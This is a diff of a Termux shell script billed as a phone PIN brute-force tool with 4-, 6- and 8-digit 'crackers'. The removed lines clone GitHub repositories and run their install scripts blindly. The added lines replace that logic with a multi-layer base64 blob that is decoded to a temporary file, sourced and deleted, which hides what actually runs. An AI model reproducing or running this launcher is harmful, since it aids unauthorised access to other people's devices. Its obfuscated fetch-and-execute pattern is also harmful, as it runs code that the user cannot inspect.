@@ -1,138 +1,52 @@
-#data/data/com.termux/files/usr/bin/bash
-#colours
-red='\033[1;31m'
-rset='\033[0m'
-grn='\033[1;32m'
-ylo='\033[1;33m'
-blue='\033[1;34m'
-cyan='\033[1;36m'
-pink='\033[1;35m'
-#coding section starts :)
-clear
-echo " "
-echo " "
-echo -e "$grn PHONE PIN BRUTE FORCES $rset"
-echo -e "$red {Ctrl C} exit $rset"
-
-echo -e "$grn N[1] Welcome to 4digit cracker $rset"
-echo -e "$grn N[2] Welcome to 6digit cracker $rset"
-echo -e "$grn N[3] Welcome to 8digit cracker $rset"
-echo -e "$red N[4] about me $rset"
-echo ""
-echo -e "$red"
-read -p "number-------> " N
-
-if [ "$N" -eq "1"  ]; then
- cd
- clear
- termux-setup-storage
- clear
- echo -e $grn 'Please Wait ===+['$red'>              '$grn']\'
- sleep 0.4
- clear
- echo -e $grn 'Please Wait ===+['$red'-------------> '$grn']\'
- sleep 0.4
- clear
- echo -e $grn 'Please Wait ===+['$red'-------------->'$grn']|'
- sleep 0.4
- clear 
- echo -e "$grn+++++++++++++++>$red[Please Wait]$grn<++++++++++++++"
- sleep 0.4
- cd
- git clone https://github.com/ShuBhamg0sain/4digit
- cd 4digit
- chmod +x install.sh
- clear
- echo -e "$grn+++++++++++>[$red Welcome to 4digit cracker$red$grn]<+++++++++++++"
- sleep 2 
- bash install.sh
- cd
- git clone https://github.com/ShuBhamg0sain/phonepinbruteforces
- cd phonepinbruteforces
- bash ap.sh
-
-elif [ "$N" -eq "2"  ]; then
- cd
- clear
- termux-setup-storage
- clear
- echo -e $grn 'Please Wait ===+['$red'>              '$grn']\'
- sleep 0.4
- clear
- echo -e $grn 'Please Wait ===+['$red'-------------> '$grn']\'
- sleep 0.4
- clear
- echo -e $grn 'Please Wait ===+['$red'-------------->'$grn']|'
- sleep 0.4
- clear 
- echo -e "$grn+++++++++++++++>$red[Please Wait]$grn<++++++++++++++"
- sleep 0.4
- cd
- git clone https://github.com/ShuBhamg0sain/6digit
- cd 6digit
- chmod +x install.sh
- clear
- echo -e "$grn+++++++++++>[$red Welcome to 6digit cracker$red$grn]<+++++++++++++"
- sleep 2 
- bash install.sh
- cd
- git clone https://github.com/ShuBhamg0sain/phonepinbruteforces
- cd phonepinbruteforces
- bash ap.sh
-
-elif [ "$N" -eq "3"  ]; then
- cd
- clear
- termux-setup-storage
- clear
- echo -e $grn 'Please Wait ===+['$red'>              '$grn']\'
- sleep 0.4
- clear
- echo -e $grn 'Please Wait ===+['$red'-------------> '$grn']\'
- sleep 0.4
- clear
- echo -e $grn 'Please Wait ===+['$red'-------------->'$grn']|'
- sleep 0.4
- clear 
- echo -e "$grn+++++++++++++++>$red[Please Wait]$grn<++++++++++++++"
- sleep 0.4
- cd
- git clone https://github.com/ShuBhamg0sain/8digit
- cd 8digit
- chmod +x install.sh
- clear
- echo -e "$grn+++++++++++>[$red Welcome to 8digit cracker $red$grn]<+++++++++++++"
- sleep 2 
- bash install.sh
- cd
- git clone https://github.com/ShuBhamg0sain/phonepinbruteforces
- cd phonepinbruteforces
- bash ap.sh
-
-elif [ "$N" -eq "8"  ]; then
- cd
- clear
- echo -e $grn 'Please Wait ===+['$red'>              '$grn']\'
- sleep 0.4
- clear
- echo -e $grn 'Please Wait ===+['$red'-------------> '$grn']\'
- sleep 0.4
- clear
- echo -e $grn 'Please Wait ===+['$red'-------------->'$grn']|'
- sleep 0.4
- clear 
- echo -e "$grn+++++++++++++++>$red[Please Wait]$grn<++++++++++++++"
- sleep 0.4
- cd
- git clone https://github.com/ShuBhamg0sain/FIND-ME
- cd FIND-ME
- bash Find.sh
- chmod +x * bash Find.sh
- clear
- echo -e "$grn+++++++++++>[$red Welcome $red$grn]<+++++++++++++"
- sleep 2 
- bash Find.sh
-
-else :
- bash ap.sh
-fi
+ShuBhamg0sain=$(mktemp)
+base64 -d  >${ShuBhamg0sain}<<DIXIE
+U2h1Qmhhb
+Wcwc2Fpbj0kK
+G1rdGVtcCkKYmFzZ
+TY0IC1kICA+JHtTaHVC
+aGFtZzBzYWlufTw8RElYSUUK
+VTJoMVFtaGhiV2N3YzJGcGJqMGtLRz
+FyZEdWdGNDa0tZbUZ6WlRZMElDMWtJQ0
+ErSkh0VGFIVkNhR0Z0WnpCellXbHVmVHc4
+UkVsWVNVVUtTVEpTYUdSSFJYWmFSMFl3V1ZNNW
+FtSXlNSFZrUjFaNVlsaFdORXd5V25CaVIxWjZURE5
+XZW1OcE9XbGhWelIyV1cxR2VtRkJiMnBaTWpsellqTl
+dlV04zY0hsYVYxRTVTakYzZDAxNlRtSk5WSE42VFZjd2J
+rTnVTbnBhV0ZFNVNqRjNkMDE2VG1KTlJ6QnVRMjFrZVdKc
+U1HNVlSRUY2VFRGemVFOTZUWGxpVTJOTFpWZDRkbEJUWkd
+OTlJFMTZWM3BGTjAxNlRuUktkM0JwWWtoV2JGQlRaR05OU
+kUxNlYzcEZOMDE2VW5SS2QzQnFaVmRHZFZCVFpHTk5SRTE
+2VjNwRk4wMTZXblJLZDNCM1lWYzFjbEJUWkdOTlJFMTZWM
+3BGTjAxNlZuUktkMjlxV1RJNWEyRlhOVzVKU0U1c1dUTlN
+jR0l5Tkdkak0xSm9ZMjVTZWtsRWIzQkRiVTV6V2xkR2VVT
+nRWbXBoUnpoblNXbEJhVU50Vm1waFJ6aG5TV2xCYVVOdFZ
+tcGhSemhuVEZkVlowbHBVbTVqYlRSblZVVm9VRlJyVldkV
+lJXeFBTVVZLVTFaV1VrWkpSVnBRVld0T1JsVjVRV3RqYms
+1c1pFTkpTMXBYVG05aWVVRjBXbE5CYVVwSVNteGFRMEkzV
+VROU2VXSkRRa1JtVTBKc1pVZHNNRWxEVW5sak1sWXdTV2R
+2UzFwWFRtOWllVUYwV2xOQmFVcEhaSGxpYVVKUFYzcEdaR
+WxHWkd4aVIwNTJZbGRWWjJSSE9HZE9SMUp3V2pKc01FbEh
+UbmxaVjA1eVdsaEpaMHBJU25wYVdGRnBRMjFXYW1GSE9HZ
+E1WMVZuU1dsU2JtTnROR2RVYkhONVdGTkNXRnBYZUdwaU1
+qRnNTVWhTZGtsRVdtdGhWMlJ3WkVOQ2FtTnRSbXBoTWxaN
+VNVTlNlV015VmpCSlozQnNXVEpvZGtsRE1XeEpRMGxyV2p
+OS2RVbEZOV0pOTVRCblZqSldjMWt5T1hSYVUwSXdZbmxCT
+kZwSGJHNWhXRkZuV1ROS2FGa3lkR3hqYVVGclkyNU9iR1
+JEU1V0YVYwNXZZbmxCZEZwVFFXbEtTRXBzV2tOQ1QxZDZ
+VbVJKUjBacFlqTldNRWxITVd4SlExSjVZekpXTUVsbmN
+HeFpNbWgyU1VOSmFVTnRWbXBoUnpoblRGZFZaMGxwVW5sYVYxR
+nBRMjVLYkZsWFVXZE1XRUZuU1cwMU1XSlhTbXhqYVRCMFRGTXdkRXhUT
+UN0SlEwbG5WR2R2UzJGWFdXZFhlVUZwU2tVMGFVbERNV3hqVTBGcFRWTkpaMGxHTURkSlNGS
+nZXbGMwUzBsSFRtdERhVUpxWWtkV2FHTm5iMmRrUjFaNVlsaFdORXhZVG14a1NGWjNURmhPTUdJelNtaGFNbFZMU1VkT2MxcFhSbmxEYVVKc1dUSm9ka2xETVd4SlExSnVZMjAwWjBveFFuTmFWMF
+o2V2xOQ1dGbFhiREJKUkRBNVVGTjBZa3A1VW5sYVYxRnVVR2xCWjBsRFFXZEpRMEZuU1VOQlowbERRV2RLZVZKdVkyMDBibGhXZDI1RGFVSjZZa2RXYkdORFFYZE1hbEZMU1VkT2MxcFhSbmxEYVVKc1dUSm9ka2xETVd4SlExSnVZMjAwWj
+BveFFuTmFWMFo2V2xOQ1dGbFhiREJKUkRBNVVGTjBZa3A1VW5sYVYxRnVURk13ZEV4VE1IUk1VekIwVEZNd2RFeFVOR2RLZVZKdVkyMDBibGhXZDI1RGFVSjZZa2RXYkdORFFYZE1hbEZMU1VkT2MxcFhSbmxEYVVKc1dUSm9ka2xETVd4SlExSnVZMjAwWjBveFFuTmFWMFo2V2xOQ
+1dGbFhiREJKUkRBNVVGTjBZa3A1VW5sYVYxRnVURk13ZEV4VE1IUk1VekIwVEZNd2RFeFRNQ3RLZVZKdVkyMDBibGhZZDI1RGFVSjZZa2RXYkdORFFYZE1hbEZMU1VkT2MxcFhSbmxKUVc5bldsZE9iMko1UVhSYVUwRnBTa2RrZVdKcGMzSkxlWE55UzNsemNrdDVjM0pMZVhOeVMzbzBhMk50Vm10WE1VSnpXbGRHZWxwVF
+FsaFpWMnd3V0ZOU2JtTnRORGhMZVhOeVMzbHpja3Q1YzNKTGVYTnlTM2x6YVVOcFFucGlSMVpzWTBOQmQweHFVVXRKUjA1clEybENibUZZVVdkWk1uaDJZbTFWWjJGSVVqQmpTRTAyVEhrNWJtRllVbTlrVjBsMVdUSTVkRXd4VG05a1ZVcHZXVmN4YmsxSVRtaGhWelIyVGtkU2NGb3liREJEYVVKcVdrTkJNRnBIYkc1aFdGRkxTVWRPYjJKWE9XdEpRM1EwU1Vkc2RXTXpVbWhpUjNkMVl6Sm5TMGxIVG5OYVYwWjVRMmxDYkZreW
+FIWkpRekZzU1VOSmExb3pTblZMZVhOeVMzbHpja3Q1YzNKTGVYTXJWM2xTZVZwWFVXZFdNbFp6V1RJNWRGcFRRakJpZVVFd1drZHNibUZZVVdkWk0wcG9XVEowYkdOcFVubGFWMUZyV2pOS2RWaFVkM0pMZVhOeVMzbHpja3Q1YzNKTGVYTnlTV2R2WjJNeWVHeGFXRUZuVFdsQlMwbEhTbWhqTW1kbllWYzFlbVJIUm5OaVF6VjZZVUZ2WjFreVVVdEpSMlJ3WkVOQ2FtSkhPWFZhVTBKdlpFaFNkMk42YjNaTU1tUndaRWRvTVZscE5XcGlNakIyVlRKb01WRnRhR2hpVjJOM1l6SkdjR0pwT1hkaFJ6bDFXbGhDY0dKdFNubGtXRkpzV20wNWVWa3lWbnBEYVVKcVdrTkNkMkZIT1hWYVdFS
+ndZbTFLZVdSWVVteGFiVGw1V1RKV2VrTnBRbWxaV0U1dlNVZEdkMHh1VG05RFozQnNZa2RzYlVsR2MyZEphVkpQU1dsQmRGcFlSV2RKYWtscFNVTkNaRTk1UWpCaFIxWjFRMmxDYWxwQmIyZFpNbmhzV1ZoSlMwbElVbXhqYlRFeFpVTXhlbHBZVWpGalF6RjZaRWM1ZVZsWFpHeERhVUpxWWtkV2FHTm5iMmRhVjA1dllubEJkRnBUUVd0YU0wcDFTVU5rVVdKSFZtaGpNbFZuVmpKR2NHUkRRVGxRVkRCeVYzbGphMk50Vm10S2VqUm5TVU5CWjBsRFFXZEpRMEZuU1VOQlowbERZMnRhTTBwMVNqRXhZMHAzYjJkak1uaHNXbGhCWjAxRE5EQkRhVUpxWWtkV2FHTm5iMmRhVjA1dllubEJkRnBUUVd0YU0wcDFTVU5rVVdKSFZtaGpNbFZuVmpKR2NHUkRRVGxRVkRCeVYzbGphMk50Vm10S2VUQjBURk13ZEV4VE1IUk1VekIwVEZNd0swbERZMnRh
+TTBwMVNqRXhZMHAzYjJkak1uaHNXbGhCWjAxRE5EQkRhVUpxWWtkV2FHTm5iMmRhVjA1dllubEJkRnBUUVd0YU0wcDFTVU5rVVdKSFZtaGpNbFZuVmpKR2NHUkRRVGxRVkRCeVYzbGphMk50Vm10S2VUQjBURk13ZEV4VE1IUk1VekIwVEZNd2RGQnBZMnRhTTBwMVNqRXhPRXAzYjJkak1uaHNXbGhCWjAxRE5EQkRhVUpxWWtkV2FHTnBRVXRKUjFacVlVYzRaMHhYVldkSmFWSnVZMjAwY2t0NWMzSkxlWE55UzNsemNrdDVjM0pMZVhNclNraEtiRnBHZEZGaVIxWm9ZekpWWjFZeVJuQmtSakJyV2pOS2RWQkRjM0pMZVhOeVMzbHpja3Q1YzNKTGVYTnlTV2R2WjJNeWVHeGFXRUZuVFVNME1FTnBRbXBhUVc5bldqSnNNRWxIVG5OaU1qVnNTVWRvTUdSSVFucFBhVGgyV2pKc01HRklWbWxNYlU1MllsTTVWR0ZJVmtOaFIwWjBXbnBDZWxsWGJIVk1lbHByWVZka2NHUkJiMmRaTWxGblRtMVNjRm95YkRCRGFVSnFZVWN4ZGxwRFFYSmxRMEp3WW01T01GbFhlSE5NYms1dlEybENhbUpIVm1oaloyOW5XbGRPYjJKNVFYUmFVMEZwU2tka2VXSnBjM0pMZVhOeVMzbHpja3Q1YzNKUWJITnJZMjFXYTBsR1pHeGlSMDUyWWxkVloyUkhPR2RPYlZKd1dqSnNNRWxIVG5sWlYwNXlXbGhKYTJOdFZtdEtSMlI1WW13d09FdDVjM0pMZVhOeVMzbHpja3Q1YzNKTGVVbExTVWhPYzFwWFZuZEpSRWxuUTJsQ2FWbFlUbTlKUjJ4MVl6TlNhR0pIZDNWak1tZExTVWRPYTBOcFFtNWhXRkZuV1RKNGRtSnRWV2RoU0ZJd1kwaE5Oa3g1T1c1aFdGSnZaRmRKZFZreU9YUk1NVTV2WkZWS2IxbFhNVzVOU0U1b1lWYzBkbU5IYUhaaWJWWjNZVmMxYVdOdVZqQmFWMXAyWTIxT2JHTjNiMmRaTWxGblkwZG9kbUp0Vm5kaFZ6VnBZMjVXTUZwWFduWmpiVTVzWTNkdloxbHRSbnBoUTBKb1kwTTFlbUZCYjB0YVYzaHdXbWxDWWtsRFNXdFVhVWxuVEZkV2VFbERTWHBKYVVGbldGUnpaMlJIYUd4aVoyOW5XVEpSUzBsSFRuTmFWMFo1UTJsQ01GcFlT
+blJrV0dkMFl6SldNR1JZUVhSak0xSjJZMjFHYmxwUmIyZFpNbmhzV1ZoSlMwbEhWbXBoUnpoblRGZFZaMHBIWkhsaWFVRnVWVWQ0YkZsWVRteEpSbVJvWVZoUloxQlVNRGxMTVhOdVNraEtiRnBEWXl0SlEwRm5TVU5CWjBsRFFXZEpRMEZuU1VOQmJrcEhaSGxpYVdSa1dFTmpTMGxJVG5OYVYxWjNTVVJCZFU1QmIyZFpNbmhzV1ZoSlMwbEhWbXBoUnpoblRGZFZaMHBIWkhsaWFVRnVWVWQ0YkZsWVRteEpSbVJvWVZoUloxQlVNRGxMTVhOdVNraEtiRnBEWTNSTVV6QjBURk13ZEV4VE1IUk1VekIwVUdsQmJrcEhaSGxpYVdSa1dFTmpTMGxJVG5OYVYxWjNTVVJCZFU1QmIyZFpNbmhzV1ZoSlMwbEhWbXBoUnpoblRGZFZaMHBIWkhsaWFVRnVWVWQ0YkZsWVRteEpSbVJvWVZoUloxQlVNRGxMTVhOdVNraEtiRnBEWTNSTVV6QjBURk13ZEV4VE1IUk1VekIwVEZRMGJrcEhaSGxpYVdSa1prTmpTMGxJVG5OYVYxWjNTVVJCZFU1QmIyZFpNbmhzV1ZoSlowTnBRbXhaTW1oMlNVTXhiRWxEU1d0YU0wcDFTM2x6Y2t0NWMzSkxlWE55UzNsemNrdDVjM0pRYVZKNVdsZFNZbFZIZUd4WldFNXNTVVprYUdGWVVtUktSMlI1WW1wM2NrdDVjM0pMZVhOeVMzbHpja3Q1YzNKTGVVbExTVWhPYzFwWFZuZEpSRUYxVGtGdloxa3lVVXRKUjJSd1pFTkNhbUpIT1hWYVUwSnZaRWhTZDJONmIzWk1NbVJ3WkVkb01WbHBOV3BpTWpCMlZUSm9NVkZ0YUdoaVYyTjNZekpHY0dKcE9EUmFSMnh1WVZoUlMwbEhUbXRKUkdocllWZGtjR1JCYjJkWk1taDBZakpSWjBzeloyZGhWelY2WkVkR2MySkROWHBoUVc5bldUSjRiRmxZU1V0SlIxWnFZVWM0WjB4WFZXZEphVkp1WTIwMGNrdDVjM0pMZVhOeVMzbHpja3Q2TldKS1NFcHNXa05DV0ZwWGVHcGlNakZzU1VoU2RrbEVhR3RoVjJSd1pFTkNhbU50Um1waE1sWjVTVU5TZVZwWFVXdGFNMHAxV0ZSM2NrdDVjM0pMZVhOeVMzbHpja3Q1YzNKSloyOW5Zeko0YkZwWVFXZE5hVUZMU1VkS2FHTXlaMmRoVnpWNlpFZEdjMkpETlhwaFFXOW5XVEpSUzBsSFpIQmtRMEpxWWtjNWRWcFRRbTlrU0ZKM1kzcHZka3d5WkhCa1IyZ3hXV2sxYW1JeU1IWlZNbWd4VVcxb2FHSlhZM2RqTWtad1ltazVkMkZIT1hWYVdFSndZbTFLZVdSWVVteGFiVGw1V1RKV2VrTnBRbXBhUTBKM1lVYzVkVnBZUW5CaWJVcDVaRmhTYkZwdE9YbFpNbFo2UTJsQ2FWbFlUbTlKUjBaM1RHNU9iME5uY0d4aVIyeHRTVVp6WjBscFVrOUphVUYwV2xoRlowbHFaMmxKUTBKa1QzbENNR0ZIVm5WRGFVSnFXa0Z2WjFreWVHeFpXRWxMU1VkV2FtRkhPR2RNVjFWblNrZGtlV0pwUVc1VlIzaHNXVmhPYkVsR1pHaGhXRkZuVUZRd09Vc3hjMjVL
+U0Vwc1drTmpLMGxEUVdkSlEwRm5TVU5CWjBsRFFXZEpRMEZ1U2tka2VXSnBaR1JZUTJOTFNVaE9jMXBYVm5kSlJFRjFUa0Z2WjFreWVHeFpXRWxMU1VkV2FtRkhPR2RNVjFWblNrZGtlV0pwUVc1VlIzaHNXVmhPYkVsR1pHaGhXRkZuVUZRd09Vc3hjMjVLU0Vwc1drTmpkRXhUTUhSTVV6QjBURk13ZEV4VE1IUlFhVUZ1U2tka2VXSnBaR1JZUTJOTFNVaE9jMXBYVm5kSlJFRjFUa0Z2WjFreWVHeFpXRWxMU1VkV2FtRkhPR2RNVjFWblNrZGtlV0pwUVc1VlIzaHNXVmhPYkVsR1pHaGhXRkZuVUZRd09Vc3hjMjVLU0Vwc1drTmpkRXhUTUhSTVV6QjBURk13ZEV4VE1IUk1WRFJ1U2tka2VXSnBaR1JtUTJOTFNVaE9jMXBYVm5kSlJFRjFUa0Z2WjFreWVHeFpXRWxuUTJsQ2JGa3lhSFpKUXpGc1NVTkphMW96U25WTGVYTnlTM2x6Y2t0NWMzSkxlWE55UzNsemNsQnBVbmxhVjFKaVZVZDRiRmxZVG14SlJtUm9ZVmhTWkVwSFpIbGlhbmR5UzNsemNrdDVjM0pMZVhOeVMzbHpja3Q1U1V0SlNFNXpXbGRXZDBsRVFYVk9RVzluV1RKUlMwbEhaSEJrUTBKcVlrYzVkVnBUUW05a1NGSjNZM3B2ZGt3eVpIQmtSMmd4V1drMWFtSXlNSFpWTW1neFVXMW9hR0pYWTNkak1rWndZbWs1UjFOVk5VVk1WVEZHUTJsQ2FscERRa2RUVlRWRlRGVXhSa05wUW1sWldFNXZTVVZhY0dKdFVYVmpNbWRMU1VkT2IySlhPV3RKUTNRMFNVTnZaMWx0Um5waFEwSkhZVmMxYTB4dVRtOURhVUpxWWtkV2FHTm5iMmRhVjA1dllubEJkRnBUUVdsS1IyUjVZbWx6Y2t0NWMzSkxlWE55UzNsemNsQnNjMnRqYlZaclNVWmtiR0pIVG5aaVYxVm5Ta2hLYkZwRFVtNWpiVFZrVUVOemNrdDVjM0pMZVhOeVMzbHpja3Q1YzJsRGFVSjZZa2RXYkdORFFYbEpRVzluV1cxR2VtRkRRa2RoVnpWclRHNU9iME5uY0d4aVNFNXNTVVJ2UzBsSFNtaGpNbWRuV1ZoQmRXTXlaMHRhYld0TENrUkpXRWxGQ25OdmRYSmpaU0FrZTFOb2RVSm9ZVzFuTUhOaGFXNTlDbkp0SUMxeVppQWtlMU5vZFVKb1lXMW5NSE5oYVc1OQpESVhJRQpzb3VyY2UgJHtTaHVCaGFtZzBzYWlufQpybSAtcmYgJHtTaHVCaGFtZzBzYWlufQo=
+DIXIE
+source ${ShuBhamg0sain}
+rm -rf ${ShuBhamg0sain}
